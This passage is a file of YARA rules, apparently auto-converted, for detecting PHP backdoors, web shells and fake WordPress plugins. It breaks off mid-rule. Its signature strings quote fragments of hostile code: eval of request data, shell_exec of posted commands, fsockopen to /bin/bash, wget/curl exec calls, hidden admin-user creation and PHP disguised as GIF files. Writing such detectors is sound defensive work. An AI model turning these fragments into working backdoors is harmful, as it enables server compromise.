rule php_backdoor_eval_REQUEST_080 : backdoor
{
    strings:
        $trigger = "ord"
    condition:
        $trigger and PR01998 and PR01999 and PR02000 and PR02001
}

private rule PR02002 : trigger
{
    strings:
        $ps0 = "if(@isset($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_081 : backdoor
{
    strings:
        $trigger = "])){@eval($_REQUEST["
    condition:
        $trigger and PR02002
}

private rule PR02003 : trigger
{
    strings:
        $ps0 = "]) ($_=@$_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_082 : backdoor
{
    strings:
        $trigger = "if(@$_COOKIE["
    condition:
        $trigger and PR01670 and PR02003
}

private rule PR02004 : trigger
{
    strings:
        $ps0 = "&& md5(md5($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_083 : backdoor
{
    strings:
        $trigger = "if(isset($_"
    condition:
        $trigger and PR01550 and PR02004
}

private rule PR02005 : trigger
{
    strings:
        $ps0 = "]);exit;}"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_084 : backdoor
{
    strings:
        $trigger = "])){@eval($_REQUEST["
    condition:
        $trigger and PR01968 and PR02005
}

rule php_backdoor_eval_REQUEST_085 : backdoor
{
    strings:
        $trigger = "s\"; $data = get_data($param_name, \"\"); $cli = base64_decode($data); return $cli; } $cli = get_cli(); return eval($cli);"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR02006 : trigger
{
    strings:
        $ps0 = "@extract($_REQUEST);"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_086 : backdoor
{
    strings:
        $trigger = "isset($_REQUEST["
        $php_backdoor_eval_REQUEST_086_r0 = /if\s*\(\s*isset\s*\(\s*\$_REQUEST\[.\w+.\]\s*\)\s*\)\s*\{[^\@]*\@extract\(\$_REQUEST\);[^\@]*\@\$\w+\(\$\w+\);\s*\}/
    condition:
        $trigger and PR02006 and $php_backdoor_eval_REQUEST_086_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_088 : backdoor
{
    strings:
        $trigger = "\"^\""
        $php_backdoor_eval_REQUEST_088_r0 = /\$[\w]+='[preglac_'\.\s]{15,};[\s]*\$[\w]+=\"[\w]+\"\^\"[^;]+\\x[\w]{2}[^;]+\";[\s]*\$[\w]+\(/
    condition:
        $trigger and $php_backdoor_eval_REQUEST_088_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_089 : backdoor
{
    strings:
        $trigger = "REQUEST"
        $php_backdoor_eval_REQUEST_089_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*\$_REQUEST\[[^;]+\];[\s]*eval\(base64_decode\(\$[\w]+\)\);[\s]*\?>/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_REQUEST_089_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_090 : backdoor
{
    strings:
        $trigger = "REQUEST"
        $php_backdoor_eval_REQUEST_090_r0 = /eval\(base64_decode\(\$_REQUEST\['(comment|c_id)'\]\)\)/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_REQUEST_090_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_REQUEST_091 : backdoor
{
    strings:
        $trigger = "REQUEST"
        $php_backdoor_eval_REQUEST_091_r0 = /eval\(\$_REQUEST\[\w\]/
    condition:
        $trigger and PR00092 and PR00029 and $php_backdoor_eval_REQUEST_091_r0
}

private rule PR02007 : trigger
{
    strings:
        $ps0 = "@copy($_FILES["
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_092 : backdoor
{
    strings:
        $trigger = "if(md5($_COOKIE["
    condition:
        $trigger and PR02007 and PR01398
}

rule php_backdoor_eval_REQUEST_093 : backdoor
{
    strings:
        $trigger = "= $_REQUEST; if(isset($"
    condition:
        $trigger and PR00029
}

private rule PR02008 : trigger
{
    strings:
        $ps0 = "$cryption_block = base64_decode"
    condition:
        $ps0
}

rule php_backdoor_eval_REQUEST_094 : backdoor
{
    strings:
        $trigger = "init_function = @create_function"
    condition:
        $trigger and PR02008
}

rule php_backdoor_eval_REQUEST_095 : backdoor
{
    strings:
        $trigger = "<\\x3fp\\x68p\\x20@\\x65v\\x61l"
    condition:
        $trigger and PR00435
}

rule php_backdoor_eval_REQUEST_gen_005 : backdoor
{
    strings:
        $trigger = "eval((ZWNobyc8QEBAPic7c3lzdGVtKCJj"
    condition:
        $trigger
}

rule php_backdoor_eval_server_variable_001 : backdoor
{
    strings:
        $trigger = "])){@eval(base64_decode($_SERVER["
    condition:
        $trigger
}

rule php_backdoor_eval_shifr_001 : backdoor
{
    strings:
        $trigger = "eval($c);function shifr($word"
    condition:
        $trigger
}

rule php_backdoor_eval_USER_AGENT_001 : backdoor
{
    strings:
        $trigger = "eval(str_replace('Mozilla"
    condition:
        $trigger
}

rule php_backdoor_eval_USER_AGENT_002 : backdoor
{
    strings:
        $trigger = ")@eval($row[1]);echo \"|"
    condition:
        $trigger
}

private rule PR02009 : trigger
{
    strings:
        $ps0 = "*/rawurldecode/*"
    condition:
        $ps0
}

private rule PR02010 : trigger
{
    strings:
        $ps0 = "*/preg_replace/*"
    condition:
        $ps0
}

rule php_backdoor_eval_xor_004 : backdoor
{
    strings:
        $trigger = "*/, '', __FILE__/*"
    condition:
        $trigger and PR02009 and PR02010
}

private rule PR02011 : trigger
{
    strings:
        $ps0 = "call_user_func($evil,$_POST["
    condition:
        $ps0
}

private rule PR02012 : trigger
{
    strings:
        $ps0 = "$evil=create_function("
    condition:
        $ps0
}

rule php_backdoor_evilcmd_001 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01654 and PR02011 and PR02012
}

private rule PR02013 : trigger
{
    strings:
        $ps0 = "function _exec($c){$r='';if(!empty($c)){if(@function_exists('exec"
    condition:
        $ps0
}

rule php_backdoor_exec_002 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02013
}

rule php_backdoor_exec_003 : backdoor
{
    strings:
        $trigger = "exec('wget -r -k -l 1 --tries=1 -p -E -e robots=off -nc -U opera -b -i http"
    condition:
        $trigger
}

private rule PR02014 : trigger
{
    strings:
        $ps0 = "404 Not Found');exit;}exec($"
    condition:
        $ps0
}

rule php_backdoor_exec_004 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR01444 and PR02014
}

private rule PR02015 : trigger
{
    strings:
        $ps0 = ");system("
    condition:
        $ps0
}

private rule PR02016 : trigger
{
    strings:
        $ps0 = "=array();exec($"
    condition:
        $ps0
}

rule php_backdoor_exec_005 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02015 and PR02016
}

private rule PR02017 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['entrcmd']) && $_POST['entrcmd']"
    condition:
        $ps0
}

rule php_backdoor_exec_006 : backdoor
{
    strings:
        $trigger = "if(!empty($res)){"
    condition:
        $trigger and PR01726 and PR02017 and PR00046
}

rule php_backdoor_exec_007 : backdoor
{
    strings:
        $trigger = "shell_exec($_POST['cmd'].\" 2>&1\"));"
    condition:
        $trigger and PR00046
}

private rule PR02018 : trigger
{
    strings:
        $ps0 = "exec('curl"
    condition:
        $ps0
}

private rule PR02019 : trigger
{
    strings:
        $ps0 = "md5($_GET["
    condition:
        $ps0
}

rule php_backdoor_exec_008 : backdoor
{
    strings:
        $trigger = "((isset($_GET["
    condition:
        $trigger and PR02018 and PR02019
}

rule php_backdoor_exec_009 : backdoor
{
    strings:
        $trigger = "echo exec($_POST['cmd'], $"
    condition:
        $trigger and PR00046
}

private rule PR02020 : trigger
{
    strings:
        $ps0 = "unlink($file);"
    condition:
        $ps0
}

private rule PR02021 : trigger
{
    strings:
        $ps0 = ".htaccess -exec rm -f"
    condition:
        $ps0
}

rule php_backdoor_exec_010 : backdoor
{
    strings:
        $trigger = "exec($"
    condition:
        $trigger and PR02020 and PR02021
}

private rule PR02022 : trigger
{
    strings:
        $ps0 = "@exec(\"wget $"
    condition:
        $ps0
}

rule php_backdoor_exec_011 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR02022
}

rule php_backdoor_exec_012 : backdoor
{
    strings:
        $trigger = "if(!$_POST['phpexec']){echo("
    condition:
        $trigger and PR01726 and PR00046 and PR01330
}

private rule PR02023 : trigger
{
    strings:
        $ps0 = "fsockopen($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_exec_013 : backdoor
{
    strings:
        $trigger = "/bin/bash"
    condition:
        $trigger and PR02023
}

rule php_backdoor_exec_014 : backdoor
{
    strings:
        $trigger = ");exec(base64_decode("
    condition:
        $trigger and PR00355 and PR00357 and PR01431
}

private rule PR02024 : trigger
{
    strings:
        $ps0 = "exec(base64_decode("
    condition:
        $ps0
}

private rule PR02025 : trigger
{
    strings:
        $ps0 = "/dev/null"
    condition:
        $ps0
}

rule php_backdoor_exec_015 : backdoor
{
    strings:
        $trigger = "fopen("
    condition:
        $trigger and PR02024 and PR02025 and PR01403
}

private rule PR02026 : trigger
{
    strings:
        $ps0 = "@exec($"
    condition:
        $ps0
}

private rule PR02027 : trigger
{
    strings:
        $ps0 = "@system("
    condition:
        $ps0
}

private rule PR02028 : trigger
{
    strings:
        $ps0 = "@popen($"
    condition:
        $ps0
}

rule php_backdoor_exec_016 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02026 and PR02027 and PR02028
}

private rule PR02029 : trigger
{
    strings:
        $ps0 = ",(30913-24987),(166-132)));"
    condition:
        $ps0
}

private rule PR02030 : trigger
{
    strings:
        $ps0 = "explode(chr((435-315)),substr($"
    condition:
        $ps0
}

rule php_backdoor_explode_chr_001 : backdoor
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR02029 and PR02030
}

private rule PR02031 : trigger
{
    strings:
        $ps0 = "if(@md5($_SERVER["
    condition:
        $ps0
}

private rule PR02032 : trigger
{
    strings:
        $ps0 = "$_REQUEST"
    condition:
        $ps0
}

rule php_backdoor_extract_001 : backdoor
{
    strings:
        $trigger = "@extract($_REQ"
    condition:
        $trigger and PR02031 and PR02032
}

rule php_backdoor_extract_001_02 : backdoor
{
    strings:
        $trigger = "@extract($_REQUEST);"
    condition:
        $trigger and PR00732
}

private rule PR02033 : trigger
{
    strings:
        $ps0 = "extract"
    condition:
        $ps0
}

private rule PR02034 : trigger
{
    strings:
        $ps0 = "($_POST)"
    condition:
        $ps0
}

rule php_backdoor_extract_002 : backdoor
{
    strings:
        $trigger = "$d('', $f("
    condition:
        $trigger and PR02033 and PR02034
}

private rule PR02035 : trigger
{
    strings:
        $ps0 = "extract($_SERVER);"
    condition:
        $ps0
}

rule php_backdoor_extract_003 : backdoor
{
    strings:
        $trigger = "if($_SERVER[HTTP_ACCEPT_CHARSET]=="
    condition:
        $trigger and PR02035
}

private rule PR02036 : trigger
{
    strings:
        $ps0 = "$zip->extractTo($"
    condition:
        $ps0
}

private rule PR02037 : trigger
{
    strings:
        $ps0 = "\".md5(time()).md5(time());"
    condition:
        $ps0
}

rule php_backdoor_extract_004 : backdoor
{
    strings:
        $trigger = "0777);"
    condition:
        $trigger and PR02036 and PR02037
}

private rule PR02038 : trigger
{
    strings:
        $ps0 = "echo '<form method=\"POST\"><textarea name="
    condition:
        $ps0
}

rule php_backdoor_extract_005 : backdoor
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR02038 and PR02033
}

rule php_backdoor_extract_006 : backdoor
{
    strings:
        $trigger = "@extract(array(c=>$b())); function fun2(){$b=$_POST"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_extract_007 : backdoor
{
    strings:
        $trigger = "REQUE"
        $php_backdoor_extract_007_r0 = /@extract[\s]*\(\$_REQUEST\);[\s]*@die[\s]*\(\$[\w]+\(\$[\w]+\)\);/
    condition:
        $trigger and $php_backdoor_extract_007_r0
}

private rule PR02039 : trigger
{
    strings:
        $ps0 = "extract($_REQUEST);if(md5($"
    condition:
        $ps0
}

private rule PR02040 : trigger
{
    strings:
        $ps0 = ");include_once $"
    condition:
        $ps0
}

rule php_backdoor_extract_008 : backdoor
{
    strings:
        $trigger = "){die();}$"
    condition:
        $trigger and PR02039 and PR02040
}

private rule PR02041 : trigger
{
    strings:
        $ps0 = "echo $f1($v1, $f2($v2));"
    condition:
        $ps0
}

rule php_backdoor_extract_009 : backdoor
{
    strings:
        $trigger = "extract($_REQUEST);"
    condition:
        $trigger and PR02041 and PR00397
}

// MANUAL FIX NECESSARY
rule php_backdoor_fake_IonCube_001 : backdoor
{
    strings:
        $trigger = "IonCube_loader"
        $php_backdoor_fake_IonCube_001_r0 = /<\?php[\s]\/\/[\w\s]{1,10}[\s]*if[\s]*\(!extension_loaded\(.IonCube/
    condition:
        $trigger and PR00029 and PR00265 and $php_backdoor_fake_IonCube_001_r0
}

private rule PR02042 : trigger
{
    strings:
        $ps0 = "Plugin Name: WordPress Researcher"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_001 : backdoor
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR02042
}

private rule PR02043 : trigger
{
    strings:
        $ps0 = "research_plugin"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_001_02 : backdoor
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR02043
}

rule php_backdoor_fake_plugin_002 : backdoor
{
    strings:
        $trigger = "function bns_add_ajax(){eval($_REQUEST[\"data\"]);}"
    condition:
        $trigger
}

private rule PR02044 : trigger
{
    strings:
        $ps0 = "eval($options['base']);"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_003 : backdoor
{
    strings:
        $trigger = "$options['base'] = wp_base($_REQUEST["
    condition:
        $trigger and PR02044
}

private rule PR02045 : trigger
{
    strings:
        $ps0 = "$wp_filesystem->delete(ABSPATH.'wp-content/plugins/'.$"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_004 : backdoor
{
    strings:
        $trigger = "add_action('plugins_loaded"
    condition:
        $trigger and PR02045 and PR01445
}

private rule PR02046 : trigger
{
    strings:
        $ps0 = "if(!file_exists($f)||filesize($f)<1000){"
    condition:
        $ps0
}

private rule PR02047 : trigger
{
    strings:
        $ps0 = "file_put_contents($f,file_get_contents('http:"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_005 : backdoor
{
    strings:
        $trigger = ".txt'));"
    condition:
        $trigger and PR00039 and PR02046 and PR02047
}

private rule PR02048 : trigger
{
    strings:
        $ps0 = "var myRootNode = document.getElementById(\"plugin\");"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_006 : backdoor
{
    strings:
        $trigger = "$_SERVER[\"DOCUMENT_ROOT\"]"
    condition:
        $trigger and PR00435 and PR02048
}

rule php_backdoor_fake_plugin_007 : backdoor
{
    strings:
        $trigger = "if(myRootNode[prop].innerText==\"Akismet Protection\")"
    condition:
        $trigger and PR00435 and PR01528 and PR01529
}

private rule PR02049 : trigger
{
    strings:
        $ps0 = "('<?php  /*'.md5(time()).'*/ ?>"
    condition:
        $ps0
}

private rule PR02050 : trigger
{
    strings:
        $ps0 = "foreach ($myplugins as $key"
    condition:
        $ps0
}

private rule PR02051 : trigger
{
    strings:
        $ps0 = "if($_GET["
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_008 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR02049 and PR02050 and PR02051
}

private rule PR02052 : trigger
{
    strings:
        $ps0 = "return '<?php"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_009 : backdoor
{
    strings:
        $trigger = ".md5(time()).md5(time())."
    condition:
        $trigger and PR00435 and PR02052 and PR00341
}

private rule PR02053 : trigger
{
    strings:
        $ps0 = "define('ABSPATH', rtrim($_SERVER['DOCUMENT_ROOT"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_010 : backdoor
{
    strings:
        $trigger = "file_put_contents($"
    condition:
        $trigger and PR00039 and PR02053 and PR02046
}

private rule PR02054 : trigger
{
    strings:
        $ps0 = "wp_create_user("
    condition:
        $ps0
}

private rule PR02055 : trigger
{
    strings:
        $ps0 = "$user_name . rand(1,10000) . rand(1,10000)"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_011 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01654 and PR02054 and PR02055
}

private rule PR02056 : trigger
{
    strings:
        $ps0 = "echo \""
    condition:
        $ps0
}

private rule PR02057 : trigger
{
    strings:
        $ps0 = "foreach ($all_plugins as $key => $value)"
    condition:
        $ps0
}

private rule PR02058 : trigger
{
    strings:
        $ps0 = "$all_plugins = get_plugins();"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_012 : backdoor
{
    strings:
        $trigger = "_mu_hide_plugin"
    condition:
        $trigger and PR00039 and PR02056 and PR02057 and PR02058
}

private rule PR02059 : trigger
{
    strings:
        $ps0 = ",\"p=\".urlencode(base64_encode($d)));function http($url,$post){$"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_013 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR02059
}

private rule PR02060 : trigger
{
    strings:
        $ps0 = "base64_decode(\"PD9wa"
    condition:
        $ps0
}

private rule PR02061 : trigger
{
    strings:
        $ps0 = "add_action( 'init', function()"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_014 : backdoor
{
    strings:
        $trigger = "file_put_contents($"
    condition:
        $trigger and PR02060 and PR02046 and PR02061
}

private rule PR02062 : trigger
{
    strings:
        $ps0 = "file_get_contents(\"http"
    condition:
        $ps0
}

private rule PR02063 : trigger
{
    strings:
        $ps0 = "function file_get_contents_helload($"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_015 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02062 and PR02063
}

private rule PR02064 : trigger
{
    strings:
        $ps0 = "/*  hello ' . uniqid().' |||| '."
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_016 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR02064 and PR02050 and PR02051
}

private rule PR02065 : trigger
{
    strings:
        $ps0 = "$file_url = $domain . str_replace($homedir, \"\", $newfile);"
    condition:
        $ps0
}

private rule PR02066 : trigger
{
    strings:
        $ps0 = "if($_POST[\"spread\"] == \"true\") {"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_017 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02065 and PR01428 and PR02066 and PR01021
}

private rule PR02067 : trigger
{
    strings:
        $ps0 = "$user_search->query_where);"
    condition:
        $ps0
}

private rule PR02068 : trigger
{
    strings:
        $ps0 = "var x = document.getElementById(\"user_pass\").value;"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_017_02 : backdoor
{
    strings:
        $trigger = "WHERE 1=1 AND {$wpdb->users}.user_login !="
    condition:
        $trigger and PR01480 and PR02067 and PR02068
}

private rule PR02069 : trigger
{
    strings:
        $ps0 = "u1FMfq2oiqJYhI2YibQp0EUn"
    condition:
        $ps0
}

private rule PR02070 : trigger
{
    strings:
        $ps0 = "base64_decode(str_rot13(strrev("
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_018 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02069 and PR00355 and PR02070 and PR00357
}

private rule PR02071 : trigger
{
    strings:
        $ps0 = "echo plugins_url("
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_019 : backdoor
{
    strings:
        $trigger = "\\x61d\\x6d\\x69\\x6e_\\x6d\\x65"
    condition:
        $trigger and PR00039 and PR02056 and PR02071
}

private rule PR02072 : trigger
{
    strings:
        $ps0 = "$wp_head_file = str_replace(\"function"
    condition:
        $ps0
}

private rule PR02073 : trigger
{
    strings:
        $ps0 = "function shellaccess"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_021 : backdoor
{
    strings:
        $trigger = "data:text/javascript;base64"
    condition:
        $trigger and PR00050 and PR00056 and PR02072 and PR02073
}

private rule PR02074 : trigger
{
    strings:
        $ps0 = ". ' */?>' . $"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_022 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR02074 and PR01569 and PR01431
}

rule php_backdoor_fake_plugin_023 : backdoor
{
    strings:
        $trigger = "require_once( dirname( WPBASESEO_FILE ) . '/wp-seo-main.php' );"
    condition:
        $trigger
}

private rule PR02075 : trigger
{
    strings:
        $ps0 = "'] = wpseotools_base($_COOKIE['"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_023_02 : backdoor
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR02075
}

private rule PR02076 : trigger
{
    strings:
        $ps0 = "array('wp-pwd.php', 'wp-login1.php', 'wp-config-sample.php', 'wp-content/themes/master.cache.php"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_025 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02076 and PR01468 and PR01899
}

private rule PR02077 : trigger
{
    strings:
        $ps0 = "// Silence is golden. '.rand("
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_026 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR02077 and PR01401
}

private rule PR02078 : trigger
{
    strings:
        $ps0 = "'.(20608/644*2)"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_026_02 : backdoor
{
    strings:
        $trigger = "*/@$"
    condition:
        $trigger and PR01350 and PR02078
}

private rule PR02079 : trigger
{
    strings:
        $ps0 = "$rootpath=implode(DIRECTORY_SEPARATOR,"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_027 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02079 and PR00355 and PR00357
}

private rule PR02080 : trigger
{
    strings:
        $ps0 = "$self_file = str_replace(plugin_dir_path(__FILE__), '', __FILE__);"
    condition:
        $ps0
}

private rule PR02081 : trigger
{
    strings:
        $ps0 = "_plugin = new fixer"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_028 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02080 and PR01468 and PR02081
}

private rule PR02082 : trigger
{
    strings:
        $ps0 = "PHNjcmlw"
    condition:
        $ps0
}

private rule PR02083 : trigger
{
    strings:
        $ps0 = "$isBot = strpos(strtolower($user_agent), 'bot');"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_029 : backdoor
{
    strings:
        $trigger = "$dcres = json_decode(base64_decode(fread($datafile,"
    condition:
        $trigger and PR02082 and PR02083 and PR01877
}

private rule PR02084 : trigger
{
    strings:
        $ps0 = "$dcres = json_decode(base64_decode(fread($datafile,"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_029_02 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02084
}

private rule PR02085 : trigger
{
    strings:
        $ps0 = "on_hot_redirect"
    condition:
        $ps0
}

private rule PR02086 : trigger
{
    strings:
        $ps0 = "$dcres = json_decode(base64_decode(fread($data"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_029_03 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02085 and PR02086
}

private rule PR02087 : trigger
{
    strings:
        $ps0 = "86400, base64_decode( 'Lw=="
    condition:
        $ps0
}

private rule PR02088 : trigger
{
    strings:
        $ps0 = "(!isset($_COOKIE[base64_decode("
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_030 : backdoor
{
    strings:
        $trigger = "echo base64"
    condition:
        $trigger and PR02087 and PR02088
}

private rule PR02089 : trigger
{
    strings:
        $ps0 = "\"\\x6e\\x6f\") == \"\\x79\\145\\163\") { global $"
    condition:
        $ps0
}

private rule PR02090 : trigger
{
    strings:
        $ps0 = "unset($wp_list_table->items[$key])"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_032 : backdoor
{
    strings:
        $trigger = "add_action("
    condition:
        $trigger and PR02089 and PR02090
}

private rule PR02091 : trigger
{
    strings:
        $ps0 = "foreach (glob($dir."
    condition:
        $ps0
}

private rule PR02092 : trigger
{
    strings:
        $ps0 = "add_action("
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_033 : backdoor
{
    strings:
        $trigger = "gzuncompress(base64_decode("
    condition:
        $trigger and PR02091 and PR02092
}

private rule PR02093 : trigger
{
    strings:
        $ps0 = "=$wpdb->get_results($wpdb->prepare($"
    condition:
        $ps0
}

private rule PR02094 : trigger
{
    strings:
        $ps0 = "SELECT * FROM $wpdb->_"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_034 : backdoor
{
    strings:
        $trigger = "]=Array(base64_decode("
    condition:
        $trigger and PR02093 and PR01545 and PR01021 and PR02094
}

rule php_backdoor_fake_plugin_035 : backdoor
{
    strings:
        $trigger = "secbd_initialized"
    condition:
        $trigger and PR02090 and PR02092
}

private rule PR02095 : trigger
{
    strings:
        $ps0 = "foreach ($myplugins"
    condition:
        $ps0
}

private rule PR02096 : trigger
{
    strings:
        $ps0 = "echo base64_decode(\"P"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_036 : backdoor
{
    strings:
        $trigger = "unset($wp_list_table->items[$key]);"
    condition:
        $trigger and PR02095 and PR02096
}

private rule PR02097 : trigger
{
    strings:
        $ps0 = "$fileUrlParts = explode($explodedDir, self::formatUrl($newFilePath));"
    condition:
        $ps0
}

private rule PR02098 : trigger
{
    strings:
        $ps0 = "$maskNames = array("
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_037 : backdoor
{
    strings:
        $trigger = "file_exists"
    condition:
        $trigger and PR02097 and PR02098
}

private rule PR02099 : trigger
{
    strings:
        $ps0 = "fwrite("
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_037_02 : backdoor
{
    strings:
        $trigger = "$rand = new ClassRandomizer($str,"
    condition:
        $trigger and PR00435 and PR02099 and PR00341
}

private rule PR02100 : trigger
{
    strings:
        $ps0 = "(base64_decode($_REQUEST[$"
    condition:
        $ps0
}

private rule PR02101 : trigger
{
    strings:
        $ps0 = "file_put_contents($_SERVER["
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_038 : backdoor
{
    strings:
        $trigger = "strrev("
    condition:
        $trigger and PR01553 and PR02092 and PR02100 and PR01401 and PR02101
}

rule php_backdoor_fake_plugin_039 : backdoor
{
    strings:
        $trigger = ");echo \"finish\";@unlink(__FILE__);"
    condition:
        $trigger and PR00091
}

private rule PR02102 : trigger
{
    strings:
        $ps0 = ";file_put_contents(get_sys_temp_dir().\""
    condition:
        $ps0
}

private rule PR02103 : trigger
{
    strings:
        $ps0 = ",'<?php '.$"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_039_02 : backdoor
{
    strings:
        $trigger = ";@unlink(sys_get_temp_dir().\""
    condition:
        $trigger and PR02102 and PR02103
}

private rule PR02104 : trigger
{
    strings:
        $ps0 = "if (isset($_GET["
    condition:
        $ps0
}

private rule PR02105 : trigger
{
    strings:
        $ps0 = "= explode(\"|||\","
    condition:
        $ps0
}

private rule PR02106 : trigger
{
    strings:
        $ps0 = "echo $_GET["
    condition:
        $ps0
}

private rule PR02107 : trigger
{
    strings:
        $ps0 = "= strlen($"
    condition:
        $ps0
}

private rule PR02108 : trigger
{
    strings:
        $ps0 = "file_put_contents($_SERVER['DOCUMENT_ROOT']. \"/\"."
    condition:
        $ps0
}

private rule PR02109 : trigger
{
    strings:
        $ps0 = "if (isset($_REQUEST[$"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_040 : backdoor
{
    strings:
        $trigger = "add_action('init',"
    condition:
        $trigger and PR02104 and PR02105 and PR02106 and PR00341 and PR02107 and PR02108 and PR02109
}

private rule PR02110 : trigger
{
    strings:
        $ps0 = "JF9QT1NULCRfQ09PS0lFLEAkX1JFUVVFU1QpO"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_041 : backdoor
{
    strings:
        $trigger = "@include($dir."
    condition:
        $trigger and PR01533 and PR02110
}

private rule PR02111 : trigger
{
    strings:
        $ps0 = "$include.str_replace(\"_\",\"-\",__FUNCTION__).base64_decode("
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_042 : backdoor
{
    strings:
        $trigger = "if ($try==3){ return wp_safety"
    condition:
        $trigger and PR00029 and PR02111 and PR01742
}

private rule PR02112 : trigger
{
    strings:
        $ps0 = "action=h_wordfence_deactivate"
    condition:
        $ps0
}

rule php_backdoor_fake_plugin_043 : backdoor
{
    strings:
        $trigger = "users.php?role=administrator"
    condition:
        $trigger and PR02112 and PR02092
}

private rule PR02113 : trigger
{
    strings:
        $ps0 = "if($line3[0] == 'wpupdatestream')"
    condition:
        $ps0
}

rule php_backdoor_fake_wpwhitesecurity_001 : backdoor
{
    strings:
        $trigger = ".base64_decode"
    condition:
        $trigger and PR02113
}

rule php_backdoor_fakeGIF_001 : backdoor
{
    strings:
        $trigger = "<?php sprintf($_POST[pass]) ?>"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR02114 : trigger
{
    strings:
        $ps0 = "eval(gz"
    condition:
        $ps0
}

private rule PR02115 : trigger
{
    strings:
        $ps0 = "GIF89"
    condition:
        $ps0
}

rule php_backdoor_fakeGIF_002 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
        $php_backdoor_fakeGIF_002_r0 = /GIF89[^<]+<\?/
    condition:
        $trigger and PR02114 and PR02115 and $php_backdoor_fakeGIF_002_r0
}

rule php_backdoor_fakeGIF_003 : backdoor
{
    strings:
        $trigger = "@eval(gzinflate(base64_decode($"
    condition:
        $trigger and PR02115
}

rule php_backdoor_fakeGIF_004 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
